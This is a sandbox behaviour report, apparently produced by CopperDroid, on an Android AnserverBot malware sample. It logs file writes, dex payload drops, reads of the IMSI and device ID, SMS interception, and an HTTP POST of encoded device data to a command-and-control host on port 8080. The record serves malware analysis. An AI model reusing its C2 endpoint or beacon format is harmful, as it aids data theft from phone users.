{"behaviors": {"static": {}, "dynamic": {"host": [{"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml\\x00'}", "type": "SYSCALL", "id": 1923, "ts": 0}, {"sysname": "write", "xref": 1923, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml'}", "type": "SYSCALL", "id": 1924}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "ACCESS PERSONAL INFO", "subclass": "PHONE", "low": [{"method_name": "com.android.internal.telephony.IPhoneSubInfo.getSubscriberId()()", "type": "BINDER", "id": 1983, "ts": 0}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "ACCESS PERSONAL INFO", "subclass": "PHONE", "low": [{"method_name": "com.android.internal.telephony.IPhoneSubInfo.getDeviceId()()", "type": "BINDER", "id": 2006, "ts": 0}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/appPrefrences.xml\\x00'}", "type": "SYSCALL", "id": 2021, "ts": 0}, {"sysname": "write", "xref": 2021, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/appPrefrences.xml'}", "type": "SYSCALL", "id": 2022}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml\\x00'}", "type": "SYSCALL", "id": 2061, "ts": 0}, {"sysname": "write", "xref": 2061, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml'}", "type": "SYSCALL", "id": 2062}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml\\x00'}", "type": "SYSCALL", "id": 2120, "ts": 0}, {"sysname": "write", "xref": 2120, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml'}", "type": "SYSCALL", "id": 2130}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml\\x00'}", "type": "SYSCALL", "id": 2223, "ts": 0}, {"sysname": "write", "xref": 2223, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml'}", "type": "SYSCALL", "id": 2226}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml\\x00'}", "type": "SYSCALL", "id": 2234, "ts": 0}, {"sysname": "write", "xref": 2234, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml'}", "type": "SYSCALL", "id": 2236}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml\\x00'}", "type": "SYSCALL", "id": 2245, "ts": 0}, {"sysname": "write", "xref": 2245, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml'}", "type": "SYSCALL", "id": 2246}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/files/anservera.db\\x00'}", "type": "SYSCALL", "id": 2259, "ts": 0}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2261}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2262}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2263}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2264}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2265}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2266}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2267}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2268}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2269}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2270}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2271}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2272}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2273}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2274}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2275}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2276}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2277}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2278}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2279}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2280}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2281}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2282}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2283}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2284}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2285}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2286}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2287}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2288}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2289}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2290}, {"sysname": "write", "xref": 2259, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anservera.db'}", "type": "SYSCALL", "id": 2291}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/files/anserverb.db\\x00'}", "type": "SYSCALL", "id": 2296, "ts": 0}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2298}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2299}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2300}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2301}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2302}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2303}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2304}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2305}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2306}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2307}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2308}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2309}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2310}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2311}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2312}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2313}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2314}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2315}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2316}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2317}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2318}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2319}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2320}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2321}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2332}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2333}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2334}, {"sysname": "write", "xref": 2296, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.db'}", "type": "SYSCALL", "id": 2335}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml\\x00'}", "type": "SYSCALL", "id": 2341, "ts": 0}, {"sysname": "write", "xref": 2341, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml'}", "type": "SYSCALL", "id": 2342}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml\\x00'}", "type": "SYSCALL", "id": 2351, "ts": 0}, {"sysname": "write", "xref": 2351, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml'}", "type": "SYSCALL", "id": 2355}]}, {"tid": 77, "procname": "ActivityManager", "class": "ACCESS PERSONAL INFO", "subclass": "SMS", "low": [{"recv by": "com.catking.jndlj", "intent": "android.provider.Telephony.SMS_RECEIVED", "type": "INTENT", "id": 4089, "ts": 0}]}, {"tid": 117, "procname": "Binder Thread #", "class": "ACCESS PERSONAL INFO", "subclass": "SMS", "low": [{"recv by": "com.catking.jndlj", "intent": "android.provider.Telephony.SMS_RECEIVED", "type": "INTENT", "id": 5059, "ts": 0}]}, {"tid": 326, "procname": "Thread-10", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml\\x00'}", "type": "SYSCALL", "id": 5231, "ts": 0}, {"sysname": "write", "xref": 5231, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml'}", "type": "SYSCALL", "id": 5465}]}, {"tid": 331, "procname": "dexopt", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131138, 'mode': 420, 'filename': u'/data/data/com.catking.jndlj/files/anserverb.dex\\x00'}", "type": "SYSCALL", "id": 7779, "ts": 0}, {"sysname": "write", "xref": 7779, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.dex'}", "type": "SYSCALL", "id": 7783}, {"sysname": "write", "xref": 7779, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.dex'}", "type": "SYSCALL", "id": 7787}, {"sysname": "write", "xref": 7779, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.dex'}", "type": "SYSCALL", "id": 7788}, {"sysname": "write", "xref": 7779, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.dex'}", "type": "SYSCALL", "id": 8370}, {"sysname": "write", "xref": 7779, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.dex'}", "type": "SYSCALL", "id": 8373}, {"sysname": "write", "xref": 7779, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.dex'}", "type": "SYSCALL", "id": 8374}, {"sysname": "write", "xref": 7779, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.dex'}", "type": "SYSCALL", "id": 8375}, {"sysname": "write", "xref": 7779, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/anserverb.dex'}", "type": "SYSCALL", "id": 8380}]}, {"tid": 331, "procname": "m.catking.jndlj", "class": "EXECUTE", "low": [{"sysname": "execve", "blob": {"executed_file": "/system/bin/dexopt", "args": "[]", "retval": 0}, "type": "SYSCALL", "id": 7800, "ts": 0}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml\\x00'}", "type": "SYSCALL", "id": 8416, "ts": 0}, {"sysname": "write", "xref": 8416, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml'}", "type": "SYSCALL", "id": 8417}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml\\x00'}", "type": "SYSCALL", "id": 8426, "ts": 0}, {"sysname": "write", "xref": 8426, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml'}", "type": "SYSCALL", "id": 8427}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/11.xml\\x00'}", "type": "SYSCALL", "id": 8434, "ts": 0}, {"sysname": "write", "xref": 8434, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/11.xml'}", "type": "SYSCALL", "id": 8435}]}, {"tid": 333, "procname": "Thread-14", "class": "ACCESS PERSONAL INFO", "subclass": "PHONE", "low": [{"method_name": "com.android.internal.telephony.IPhoneSubInfo.getSubscriberId()()", "type": "BINDER", "id": 8517, "ts": 0}]}, {"tid": 333, "procname": "Thread-14", "class": "ACCESS PERSONAL INFO", "subclass": "PHONE", "low": [{"method_name": "com.android.internal.telephony.IPhoneSubInfo.getDeviceId()()", "type": "BINDER", "id": 8591, "ts": 0}]}, {"tid": 333, "procname": "Thread-14", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml\\x00'}", "type": "SYSCALL", "id": 8611, "ts": 0}, {"sysname": "write", "xref": 8611, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/0.xml'}", "type": "SYSCALL", "id": 8634}]}, {"tid": 333, "procname": "Thread-14", "class": "NETWORK ACCESS", "subclass": "DNS", "low": [{"sysname": "connect", "blob": "{'host': '10.0.2.3', 'retval': 0, 'port': 53}", "type": "SYSCALL", "id": 9117, "ts": 0}, {"sysname": "sendto", "xref": 9117, "ts": 0, "blob": "{'query_data': 'b3.8866.org. 1 1'}", "type": "SYSCALL", "id": 9118}]}, {"tid": 333, "procname": "Thread-14", "class": "NETWORK ACCESS", "low": [{"sysname": "connect", "blob": "{'host': '::ffff:111.74.238.109', 'retval': -115, 'port': 8080}", "type": "SYSCALL", "id": 9184, "ts": 0}, {"sysname": "sendto", "xref": 9184, "ts": 0, "blob": "=%7B%27destination%27%3A+%27%3A%3Affff%3A111.74.238.109+%27%2C+%27data%27%3A+%27POST+%2Fjk.action%3Fa%3D310260000000000%26a1%3DfNjYfw7YfJSYfJSYfJSY%26c%3D6%26c1%3D0n__%26d%3D2.2.3%26d1%3DfWQ29wf_%26e%3Dunknown%26e1%3DuxBm8IM48n__%26f%3Dgeneric%26f1%3DzC3OzKF17Y__%26g%3D8%26g1%3DPS__%26h%3D000000000000000%26h1%3DfJSYfJSYfJSYfJSYfJSY%26i%3D8%26i1%3DPS__%26j%3D1343206476116%26j1%3DfqfpfNVY0wl40wjs0n__%26k%3D41%26k1%3D0Jj_%26l%3D0%26l1%3DfS__%26m%3D0%26m1%3DfS__%26n%3D3%26n1%3DfY__%26p%3Dcom.catking.jndlj%26p1%3D7CMg9I05utg18IrOHIBD8tb_%26key%3DfqfpfNVY0wyNfJlNfl__+HTTP%2F1.1%5Cr%5CnUser-Agent%3A+Dalvik%2F1.2.0+%28Linux%3B+U%3B+Android+2.2.3%3B+generic+Build%2FFRK76C%29%5Cr%5CnHost%3A+b3.8866.org%3A8080%5Cr%5CnConnection%3A+Keep-Alive%5Cr%5Cn%5Cr%5Cn%27%2C+%27dest-port%27%3A+8080%7D", "type": "SYSCALL", "id": 9237}]}, {"tid": 333, "procname": "Thread-14", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/11.xml\\x00'}", "type": "SYSCALL", "id": 9683, "ts": 0}, {"sysname": "write", "xref": 9683, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/11.xml'}", "type": "SYSCALL", "id": 9697}]}, {"tid": 333, "procname": "Thread-14", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/11.xml\\x00'}", "type": "SYSCALL", "id": 9760, "ts": 0}, {"sysname": "write", "xref": 9760, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/11.xml'}", "type": "SYSCALL", "id": 9774}]}, {"tid": 333, "procname": "Thread-14", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/11.xml\\x00'}", "type": "SYSCALL", "id": 9793, "ts": 0}, {"sysname": "write", "xref": 9793, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/11.xml'}", "type": "SYSCALL", "id": 9813}]}, {"tid": 326, "procname": "Thread-10", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml\\x00'}", "type": "SYSCALL", "id": 10339, "ts": 0}, {"sysname": "write", "xref": 10339, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml'}", "type": "SYSCALL", "id": 10361}]}, {"tid": 337, "procname": "Thread-18", "class": "NETWORK ACCESS", "low": [{"sysname": "connect", "blob": "{'host': '::ffff:111.74.238.109', 'retval': -115, 'port': 8080}", "type": "SYSCALL", "id": 15009, "ts": 0}, {"sysname": "sendto", "xref": 15009, "ts": 0, "blob": "=%7B%27destination%27%3A+%27%3A%3Affff%3A111.74.238.109+%27%2C+%27data%27%3A+%27POST+%2Fjk.action%3Fa%3D310260000000000%26a1%3DfNjYfw7YfJSYfJSYfJSY%26c%3D6%26c1%3D0n__%26d%3D2.2.3%26d1%3DfWQ29wf_%26e%3Dunknown%26e1%3DuxBm8IM48n__%26f%3Dgeneric%26f1%3DzC3OzKF17Y__%26g%3D8%26g1%3DPS__%26h%3D000000000000000%26h1%3DfJSYfJSYfJSYfJSYfJSY%26i%3D8%26i1%3DPS__%26j%3D1343206476116%26j1%3DfqfpfNVY0wl40wjs0n__%26k%3D41%26k1%3D0Jj_%26l%3D0%26l1%3DfS__%26m%3D0%26m1%3DfS__%26n%3D3%26n1%3DfY__%26p%3Dcom.catking.jndlj%26p1%3D7CMg9I05utg18IrOHIBD8tb_%26key%3DfqfpfNVY0wyC0wnQ0l__+HTTP%2F1.1%5Cr%5CnUser-Agent%3A+Dalvik%2F1.2.0+%28Linux%3B+U%3B+Android+2.2.3%3B+generic+Build%2FFRK76C%29%5Cr%5CnHost%3A+b3.8866.org%3A8080%5Cr%5CnConnection%3A+Keep-Alive%5Cr%5Cn%5Cr%5Cn%27%2C+%27dest-port%27%3A+8080%7D", "type": "SYSCALL", "id": 15248}]}, {"tid": 326, "procname": "Thread-10", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml\\x00'}", "type": "SYSCALL", "id": 15102, "ts": 0}, {"sysname": "write", "xref": 15102, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/PushFlag.xml'}", "type": "SYSCALL", "id": 15125}]}, {"tid": 337, "procname": "Thread-18", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131649, 'mode': 384, 'filename': u'/data/data/com.catking.jndlj/shared_prefs/11.xml\\x00'}", "type": "SYSCALL", "id": 15695, "ts": 0}, {"sysname": "write", "xref": 15695, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/shared_prefs/11.xml'}", "type": "SYSCALL", "id": 15717}]}, {"tid": 318, "procname": "m.catking.jndlj", "class": "FS ACCESS", "low": [{"sysname": "open", "blob": "{'flags': 131138, 'mode': 420, 'filename': u'/data/data/com.catking.jndlj/files/com.catking.jndlj-1.dex\\x00'}", "type": "SYSCALL", "id": 20134, "ts": 0}, {"sysname": "write", "xref": 20134, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/com.catking.jndlj-1.dex'}", "type": "SYSCALL", "id": 20138}, {"sysname": "write", "xref": 20134, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/com.catking.jndlj-1.dex'}", "type": "SYSCALL", "id": 20143}, {"sysname": "write", "xref": 20134, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/com.catking.jndlj-1.dex'}", "type": "SYSCALL", "id": 20144}, {"sysname": "write", "xref": 20134, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/com.catking.jndlj-1.dex'}", "type": "SYSCALL", "id": 20145}, {"sysname": "write", "xref": 20134, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/com.catking.jndlj-1.dex'}", "type": "SYSCALL", "id": 20146}, {"sysname": "write", "xref": 20134, "ts": 0, "blob": "{'filename': u'/data/data/com.catking.jndlj/files/com.catking.jndlj-1.dex'}", "type": "SYSCALL", "id": 20147}]}, {"tid": 338, "procname": "m.catking.jndlj", "class": "EXECUTE", "low": [{"sysname": "execve", "blob": {"executed_file": "/system/bin/dexopt", "args": "[]", "retval": 0}, "type": "SYSCALL", "id": 20159, "ts": 0}]}]}}, "userid": "joystick", "country": "UNAVAILABLE", "date_end": "N/A", "date_start": "N/A", "date_submitted": "2012-11-19 17:58:08", "static": "/copperdroid/reports//AnserverBot_genome_stimulated/0465b4b687651a24b7e230e7b00deca6576fc1d1.apk.log", "submitter_ip": "127.0.0.1", "pcap": "/copperdroid/reports//AnserverBot_genome_stimulated/0465b4b687651a24b7e230e7b00deca6576fc1d1.apk.pcap", "md5": "700c7bf263b073e828fe6144234939a0"}